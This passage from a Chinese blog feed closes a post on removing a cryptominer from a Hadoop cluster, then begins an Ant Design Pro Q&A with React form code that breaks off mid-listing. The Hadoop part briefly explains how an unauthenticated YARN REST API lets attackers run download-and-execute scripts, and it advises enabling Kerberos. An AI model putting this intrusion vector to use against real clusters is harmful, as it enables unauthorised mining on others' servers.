    &lt;/table&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;4，排查YARN日志，确认异常的application，删除处理&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;5 再通过top验证看是否还有高cpu进程，如果有，kill掉，没有的话应该正常了。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;6 注意：YARN提供有默认开放在8088和8090的REST API（默认前者）允许用户直接通过API进行相关的应用创建、任务提交执行等操作，如果配置不当，REST API将会开放在公网导致未授权访问的问题，那么任何黑客则就均可利用其进行远程命令执行，从而进行挖矿等行为，黑客直接利用开放在8088的REST API提交执行命令，来实现在服务器内下载执行.sh脚本，从而再进一步下载启动挖矿程序达到挖矿的目的，因此注意并启用Kerberos认证功能，禁止匿名访问修改8088端口&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;感谢老铁登科&quot;&gt;感谢老铁登科&lt;/h4&gt;

&lt;p&gt;转载请注明出处，本文采用 &lt;a href=&quot;http://creativecommons.org/licenses/by-nc-nd/4.0/&quot;&gt;CC4.0&lt;/a&gt; 协议授权&lt;/p&gt;</content><author><name>unknow :)</name></author><summary type="html">简单介绍一下过程，现在有些人通过 hadoop 开放的restApi进行挖矿，8088 以及 8090 端口。</summary></entry><entry><title type="html">Ant-Design-Pro 基础问题[第四天]</title><link href="http://firsh.me/2018/05/30/ant-design-pro-stack2/" rel="alternate" type="text/html" title="Ant-Design-Pro 基础问题[第四天]" /><published>2018-05-30T11:09:03+08:00</published><updated>2018-05-30T11:09:03+08:00</updated><id>http://firsh.me/2018/05/30/ant-design-pro-stack2</id><content type="html" xml:base="http://firsh.me/2018/05/30/ant-design-pro-stack2/">&lt;p&gt;其中是我在QQ群 &lt;code class=&quot;highlighter-rouge&quot;&gt;362329545&lt;/code&gt;遇到的 问题，整理成问答录，希望能解决入门的烦恼，个人见解，如果有那里有错误请指出了我会积极改进，方便他人。&lt;/p&gt;

&lt;h2 id=&quot;问答录3问&quot;&gt;问答录[3问]&lt;/h2&gt;

&lt;h3 id=&quot;问&quot;&gt;问&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;#form_1&quot; target=&quot;_self&quot;&gt;如何编辑修改在一个Form内进行操作&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#form_2&quot; target=&quot;_self&quot;&gt;关于Ant(StandardTable)的默认数据格式&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#form_3&quot; target=&quot;_self&quot;&gt;关于Ant方法按钮方法触发的方式，以及如何定义。&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#form_4&quot; target=&quot;_self&quot;&gt;简单描述一下dispatch调用的过程。&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#form_5&quot; target=&quot;_self&quot;&gt;Redux(Router)页面跳转，携带参数的方式&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;答&quot;&gt;答&lt;/h3&gt;

&lt;h4 id=&quot;在form如何进行编辑以及新增数据&quot;&gt;&lt;span id=&quot;form_1&quot;&gt;&lt;font&gt;在Form如何进行编辑以及新增数据。&lt;/font&gt;&lt;/span&gt;&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;开始这个演示，注意注释描述,代码不一定能运行，只是整体做个介绍&lt;/p&gt;

    &lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;kr&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;CreateForm&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Form&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;create&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;props&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kr&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;modalVisible&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;form&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;handleAdd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;handleEdit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;handleModalVisible&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;formData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;formType&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;props&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;cm&quot;&gt;/** 传入的可变变量 **/&lt;/span&gt;
    &lt;span class=&quot;kr&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;okHandle&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;form&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;validateFields&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;fieldsValue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;form&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;resetFields&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;formType&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;===&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;handleAdd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;fieldsValue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/**判断类型进行展示数据，以及新增*/&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;formType&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;===&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;handleEdit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;fieldsValue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Modal&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;title&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;微信配置&quot;&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;visible&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;modalVisible&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

        &lt;span class=&quot;nx&quot;&gt;onOk&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;okHandle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//修改和新增主要看这里  &lt;/span&gt;

        &lt;span class=&quot;nx&quot;&gt;onCancel&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;handleModalVisible&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()}&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;//初始化数据 formData&lt;/span&gt;

        &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;FormItem&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;labelCol&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;wrapperCol&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;label&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;公钥&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;form&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getFieldDecorator&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'public_key'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;na&quot;&gt;initialValue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;keys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;formData&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{}).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;length&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;formData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;public_key&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;na&quot;&gt;rules&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[{&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;required&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Please input  public_key...'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}],&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;})(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Input&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;placeholder&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;请输入&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)}&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;/FormItem&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;
&lt;/span&gt;
        &lt;span class=&quot;cm&quot;&gt;/**这里定义的是 select 的数据以及修改的时候数据的加载 可以保证数据正常显示。**/&lt;/span&gt;
        &lt;span class=&quot;cm&quot;&gt;/**目前存在一些疑惑，为什么通过formData 直接绑定，在修改的时候展示的是key 不是 value 通过外部传递就可以。**/&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;FormItem&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;labelCol&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;wrapperCol&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;label&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;应用类型&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;form&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getFieldDecorator&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'channel_way'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;na&quot;&gt;initialValue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;keys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;formData&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{}).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;length&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;formData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;channel_way&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;})(&lt;/span&gt;
            &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Select&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;placeholder&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;不限&quot;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;style&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;channelWayData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;item&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
                &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Option&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;item&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;item&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
                    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;item&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;desc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
                &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;/Option&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;
&lt;/span&gt;                &lt;span class=&quot;p&quot;&gt;))}&lt;/span&gt;
            &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;/Select&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;
&lt;/span&gt;            &lt;span class=&quot;p&quot;&gt;)}&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;/FormItem&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;
&lt;/span&gt;        &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;/Modal&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;
&lt;/span&gt;    &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;

      &lt;span class=&quot;nx&quot;&gt;handleEdit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;fields&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;nx&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;success&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;JSON&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;stringify&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;fields&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
            &lt;span class=&quot;kr&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;paymentConfigId&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;state&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;kr&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;dispatch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;props&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;nx&quot;&gt;fields&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;channel_id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;paymentConfigId&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;nx&quot;&gt;dispatch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;({&lt;/span&gt;
            &lt;span class=&quot;na&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'parkingPayManager/modifyChannel'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;na&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;JSON&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;stringify&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;fields&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
            &lt;span class=&quot;na&quot;&gt;callback&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;nx&quot;&gt;dispatch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;({&lt;/span&gt;
                &lt;span class=&quot;na&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'parkingPayManager/queryChannelList'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                &lt;span class=&quot;na&quot;&gt;callback&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;nx&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;success&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;修改成功，列表已经刷新！&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;})&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;setState&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;({&lt;/span&gt;
                &lt;span class=&quot;na&quot;&gt;modalVisible&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 清除&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;})&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

        &lt;span class=&quot;nx&quot;&gt;handleAdd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;fields&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;kr&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;dispatch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;props&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;cm&quot;&gt;/**switchPress true = 0, fasle = 1 方便数据存储*/&lt;/span&gt; 
            &lt;span class=&quot;nx&quot;&gt;fields&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;channel_status&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;switchPress&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;fields&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;channel_status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;cm&quot;&gt;/**触发action触发model层的state的初始化*/&lt;/span&gt;
            &lt;span class=&quot;nx&quot;&gt;dispatch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;({&lt;/span&gt;
            &lt;span class=&quot;na&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'parkingPayManager/insertChannel'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;na&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;JSON&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;stringify&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;fields&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
